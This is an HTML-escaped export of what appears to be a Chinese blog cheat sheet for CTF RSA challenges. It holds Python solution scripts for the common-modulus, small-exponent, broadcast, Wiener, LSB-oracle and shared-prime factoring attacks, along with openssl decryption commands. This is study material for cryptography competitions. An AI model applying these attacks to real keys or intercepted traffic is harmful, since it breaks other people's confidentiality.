19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span><br><span class=\"line\">c18 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span><br><span class=\"line\"></span><br><span class=\"line\">n19 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659L</span><br><span class=\"line\">c19 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346L</span><br><span class=\"line\"></span><br><span class=\"line\"># e = 65537</span><br><span class=\"line\"></span><br><span class=\"line\">nlist = [n, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19]</span><br><span class=\"line\">clist = [c, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, n19]</span><br><span class=\"line\"></span><br><span class=\"line\"># 寻找n-n19之间是否有互素的两个数</span><br><span class=\"line\">for i in range(20):</span><br><span class=\"line\">\tfor j in range(20):</span><br><span class=\"line\">\t\tif i == j:</span><br><span class=\"line\">\t\t\tcontinue</span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tprint i, j, gcd(nlist[i], nlist[j])</span><br><span class=\"line\"></span><br><span class=\"line\">p = 132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499</span><br><span class=\"line\">q = 147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527</span><br><span class=\"line\"># n17 = p1 * p2</span><br><span class=\"line\">print gmpy2.is_prime(132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499)</span><br><span class=\"line\"></span><br><span class=\"line\">print gmpy2.is_prime(147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527)</span><br><span class=\"line\"></span><br><span class=\"line\"># m = random.randint(0x100000000000, 0xffffffffffff)b</span><br><span class=\"line\"># </span><br><span class=\"line\">def rsa_decrypt(e, c, p, q):</span><br><span class=\"line\">    phi = (p - 1) * (q - 1)</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        d = gmpy2.invert(e, phi) #求e模phi的逆</span><br><span class=\"line\">        return pow(c, d, n)</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        print &quot;e and phi are not coprime!&quot;</span><br><span class=\"line\">        raise e</span><br><span class=\"line\">e = 65537</span><br><span class=\"line\">print n2s(rsa_decrypt(e, c17, p, q))</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"共模攻击\"><a href=\"#共模攻击\" class=\"headerlink\" title=\"共模攻击\"></a>共模攻击</h2><p>适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># by https://findneo.github.io/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> libnum</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fix_py</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># decode encryption.encrypted</span></span><br><span class=\"line\">    s1 = <span class=\"string\">'abdefghijklmpqrtuvwxyz'</span></span><br><span class=\"line\">    s2 = <span class=\"string\">'dmenwfoxgpyhirasbktclu'</span></span><br><span class=\"line\">    f1 = open(<span class=\"string\">'encryption.encrypted'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">'encryption.py'</span>, <span class=\"string\">'w'</span>) <span class=\"keyword\">as</span> f2:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> f1.readlines():</span><br><span class=\"line\">            tmp = <span class=\"string\">''</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">                tmp += s2[s1.index(j)] <span class=\"keyword\">if</span> j <span class=\"keyword\">in</span> s1 <span class=\"keyword\">else</span> j</span><br><span class=\"line\">            f2.write(tmp)</span><br><span class=\"line\"><span class=\"comment\"># fix_py()</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">common_modulus</span><span class=\"params\">(n, e1, e2, c1, c2)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (libnum.gcd(e1, e2) == <span class=\"number\">1</span>)</span><br><span class=\"line\">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class=\"line\">    m = pow(c1, s1, n) <span class=\"keyword\">if</span> s1 &gt; <span class=\"number\">0</span> <span class=\"keyword\">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class=\"line\">    m *= pow(c2, s2, n) <span class=\"keyword\">if</span> s2 &gt; <span class=\"number\">0</span> <span class=\"keyword\">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class=\"line\">    m %= n</span><br><span class=\"line\">    <span class=\"keyword\">return</span> m</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[n2, n3] = map(<span class=\"keyword\">lambda</span> x: int(base64.b64decode(x).encode(<span class=\"string\">'hex'</span>), <span class=\"number\">16</span>),</span><br><span class=\"line\">               open(<span class=\"string\">'n2&amp;n3'</span>).readlines())</span><br><span class=\"line\">[n1c1, n1c2] = map(<span class=\"keyword\">lambda</span> x: int(x, <span class=\"number\">16</span>), open(<span class=\"string\">'n1.encrypted'</span>).readlines())</span><br><span class=\"line\">[msg1c1, msg2c2] = map(<span class=\"keyword\">lambda</span> x: int(x, <span class=\"number\">16</span>), open(<span class=\"string\">'ciphertext'</span>).readlines())</span><br><span class=\"line\"><span class=\"comment\"># 通过共模攻击得到n1</span></span><br><span class=\"line\">e1 = <span class=\"number\">0x1001</span></span><br><span class=\"line\">e2 = <span class=\"number\">0x101</span></span><br><span class=\"line\">n1 = common_modulus(n3, e1, e2, n1c1, n1c2)</span><br><span class=\"line\"><span class=\"comment\"># n1,n2有一个共有质因数p1</span></span><br><span class=\"line\"><span class=\"comment\"># n1 += n3  # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。</span></span><br><span class=\"line\">p1 = gmpy2.gcd(n1, n2)</span><br><span class=\"line\"><span class=\"keyword\">assert</span> (p1 != <span class=\"number\">1</span>)</span><br><span class=\"line\">p2 = n1 / p1</span><br><span class=\"line\">p3 = n2 / p1</span><br><span class=\"line\">e = <span class=\"number\">0x1001</span></span><br><span class=\"line\">d1 = gmpy2.invert(e, (p1 - <span class=\"number\">1</span>) * (p2 - <span class=\"number\">1</span>))</span><br><span class=\"line\">d2 = gmpy2.invert(e, (p1 - <span class=\"number\">1</span>) * (p3 - <span class=\"number\">1</span>))</span><br><span class=\"line\">msg1 = pow(msg1c1, d1, n1)</span><br><span class=\"line\">msg2 = pow(msg2c2, d2, n2)</span><br><span class=\"line\">msg1 = hex(msg1)[<span class=\"number\">2</span>:].decode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\">msg2 = hex(msg2)[<span class=\"number\">2</span>:].decode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> msg1, msg2</span><br><span class=\"line\"><span class=\"comment\"># XA&#123;RP0I_0Itrsigi s.y</span></span><br><span class=\"line\"><span class=\"comment\"># MNCYT_55_neetnvmrap&#125;</span></span><br><span class=\"line\"><span class=\"comment\"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"小明文攻击\"><a href=\"#小明文攻击\" class=\"headerlink\" title=\"小明文攻击\"></a>小明文攻击</h2><p>适用情况：e较小，一般为3。</p>\n<p>公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">small_msg</span><span class=\"params\">(e, n, c)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> time.asctime(), <span class=\"string\">\"Let's waiting...\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> xrange(<span class=\"number\">200000000</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> gmpy2.iroot(c + n * k, e)[<span class=\"number\">1</span>] == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> time.asctime(), <span class=\"string\">\"...done!\"</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> gmpy2.iroot(c + n * k, <span class=\"number\">3</span>)[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2,binascii,libnum,time</span><br><span class=\"line\">n=<span class=\"number\">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class=\"line\">e=<span class=\"number\">3</span></span><br><span class=\"line\">res=<span class=\"number\">0</span></span><br><span class=\"line\">c=int(open(<span class=\"string\">'extremelyhardRSA.rar/flag.enc'</span>,<span class=\"string\">'rb'</span>).read().encode(<span class=\"string\">'hex'</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> time.asctime()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">200000000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> gmpy2.iroot(c+n*i,<span class=\"number\">3</span>)[<span class=\"number\">1</span>]==<span class=\"number\">1</span>:</span><br><span class=\"line\">        res=gmpy2.iroot(c+n*i,<span class=\"number\">3</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">print</span> i,res</span><br><span class=\"line\">        <span class=\"keyword\">print</span> libnum.n2s(res)</span><br><span class=\"line\">        <span class=\"keyword\">print</span> time.asctime()</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Rabin加密中的N可被分解\"><a href=\"#Rabin加密中的N可被分解\" class=\"headerlink\" title=\"Rabin加密中的N可被分解\"></a>Rabin加密中的N可被分解</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def rabin_decrypt(c, p, q, e=2):</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    mp = pow(c, (p + 1) / 4, p)</span><br><span class=\"line\">    mq = pow(c, (q + 1) / 4, q)</span><br><span class=\"line\">    yp = gmpy2.invert(p, q)</span><br><span class=\"line\">    yq = gmpy2.invert(q, p)</span><br><span class=\"line\">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class=\"line\">    rr = n - r</span><br><span class=\"line\">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class=\"line\">    ss = n - s</span><br><span class=\"line\">    return (r, rr, s, ss)</span><br></pre></td></tr></table></figure>\n<h2 id=\"Wiener’s-Attack-低解密指数攻击\"><a href=\"#Wiener’s-Attack-低解密指数攻击\" class=\"headerlink\" title=\"Wiener’s Attack(低解密指数攻击 )\"></a>Wiener’s Attack(低解密指数攻击 )</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\"><span class=\"keyword\">import</span> ContinuedFractions, Arithmetic</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wiener_hack</span><span class=\"params\">(e, n)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class=\"line\">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class=\"line\">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (k, d) <span class=\"keyword\">in</span> convergents:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> k != <span class=\"number\">0</span> <span class=\"keyword\">and</span> (e * d - <span class=\"number\">1</span>) % k == <span class=\"number\">0</span>:</span><br><span class=\"line\">            phi = (e * d - <span class=\"number\">1</span>) // k</span><br><span class=\"line\">            s = n - phi + <span class=\"number\">1</span></span><br><span class=\"line\">            discr = s * s - <span class=\"number\">4</span> * n</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (discr &gt;= <span class=\"number\">0</span>):</span><br><span class=\"line\">                t = Arithmetic.is_perfect_square(discr)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> t != <span class=\"number\">-1</span> <span class=\"keyword\">and</span> (s + t) % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    print(<span class=\"string\">\"Hacked!\"</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> d</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">False</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"私钥文件修复\"><a href=\"#私钥文件修复\" class=\"headerlink\" title=\"私钥文件修复\"></a>私钥文件修复</h2><h2 id=\"LSB-Oracle-Attack\"><a href=\"#LSB-Oracle-Attack\" class=\"headerlink\" title=\"LSB Oracle Attack\"></a>LSB Oracle Attack</h2><p>适用情况：可以选择密文并泄露最低位。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> decimal</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">oracle</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> lsb == <span class=\"string\">'odd'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">partial</span><span class=\"params\">(c, e, n)</span>:</span></span><br><span class=\"line\">    k = n.bit_length()</span><br><span class=\"line\">    decimal.getcontext().prec = k  <span class=\"comment\"># for 'precise enough' floats</span></span><br><span class=\"line\">    lo = decimal.Decimal(<span class=\"number\">0</span>)</span><br><span class=\"line\">    hi = decimal.Decimal(n)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(k):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> oracle(c):</span><br><span class=\"line\">            hi = (lo + hi) / <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            lo = (lo + hi) / <span class=\"number\">2</span></span><br><span class=\"line\">        c = (c * pow(<span class=\"number\">2</span>, e, n)) % n</span><br><span class=\"line\">        <span class=\"comment\"># print i, int(hi - lo)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(hi)</span><br></pre></td></tr></table></figure>\n<h2 id=\"选择密文攻击\"><a href=\"#选择密文攻击\" class=\"headerlink\" title=\"选择密文攻击\"></a>选择密文攻击</h2><p>选择密文攻击<br>适用情况：可以构造任意密文并获得对应明文。</p>\n<p>这个好理解，在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足<code>gcd(x,n)==1</code> 从而使x模n的逆存在，构造密文 <code>c&#39;=c*(x^e)</code>使解密后明文为 <code>m&#39;=(m*x)%n</code> ，则<code>m=m&#39;*x^-1(mod n)</code> 。可参看模意义下的运算法则部分 。</p>\n<h2 id=\"广播攻击\"><a href=\"#广播攻击\" class=\"headerlink\" title=\"广播攻击\"></a>广播攻击</h2><p>适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据</p>\n<p>使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个<code>(m^e) ==ci (mod ni)</code>，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况。按照本文的中国剩余定理小节容易求得m^e的值，当e较小时直接开e方即可，可使用<code>gmpy2.iroot(M,e)</code> 方法。</p>\n<p>案例:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CRT</span><span class=\"params\">(mi, ai)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class=\"line\">    <span class=\"comment\"># Chinese Remainder Theorem</span></span><br><span class=\"line\">    <span class=\"comment\"># lcm=lambda x , y:x*y/gcd(x,y)</span></span><br><span class=\"line\">    <span class=\"comment\"># mul=lambda x , y:x*y</span></span><br><span class=\"line\">    <span class=\"comment\"># assert(reduce(mul,mi)==reduce(lcm,mi))</span></span><br><span class=\"line\">    <span class=\"comment\"># 以上可用于保证mi两两互质</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (isinstance(mi, list) <span class=\"keyword\">and</span> isinstance(ai, list))</span><br><span class=\"line\">    M = reduce(<span class=\"keyword\">lambda</span> x, y: x * y, mi)</span><br><span class=\"line\">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class=\"keyword\">for</span> (m, a) <span class=\"keyword\">in</span> zip(mi, ai)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> reduce(<span class=\"keyword\">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class=\"line\"></span><br><span class=\"line\">m = random.randint(<span class=\"number\">0x100000000000</span>, <span class=\"number\">0xffffffffffff</span>)</span><br><span class=\"line\">e = <span class=\"number\">3</span></span><br><span class=\"line\">n1 = <span class=\"number\">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L</span></span><br><span class=\"line\">n2 = <span class=\"number\">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L</span></span><br><span class=\"line\">n3 = <span class=\"number\">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L</span></span><br><span class=\"line\">c1 = pow(m, e, n1)</span><br><span class=\"line\">c2 = pow(m, e, n2)</span><br><span class=\"line\">c3 = pow(m, e, n3)</span><br><span class=\"line\"><span class=\"keyword\">print</span> m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"openssl相关操作\"><a href=\"#openssl相关操作\" class=\"headerlink\" title=\"openssl相关操作\"></a>openssl相关操作</h2><p>提取pubkey.pem相关信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br></pre></td></tr></table></figure>\n<p>解密:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl rsautl -decrypt -in 【flag.enc】 -inkey 【private.pem】</span><br></pre></td></tr></table></figure>\n<h2 id=\"已知p-q\"><a href=\"#已知p-q\" class=\"headerlink\" title=\"已知p,q\"></a>已知p,q</h2><p>若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def rsa_decrypt(e, c, p, q):</span><br><span class=\"line\">    phi = (p - 1) * (q - 1)</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        d = gmpy2.invert(e, phi) #求e模phi的逆</span><br><span class=\"line\">        return pow(c, d, n)</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        print &quot;e and phi are not coprime!&quot;</span><br><span class=\"line\">        raise e</span><br></pre></td></tr></table></figure>\n<h2 id=\"查询已知的n的可分解情况\"><a href=\"#查询已知的n的可分解情况\" class=\"headerlink\" title=\"查询已知的n的可分解情况\"></a>查询已知的n的可分解情况</h2><p>在线查询：<a href=\"https://factordb.com/\" target=\"_blank\" 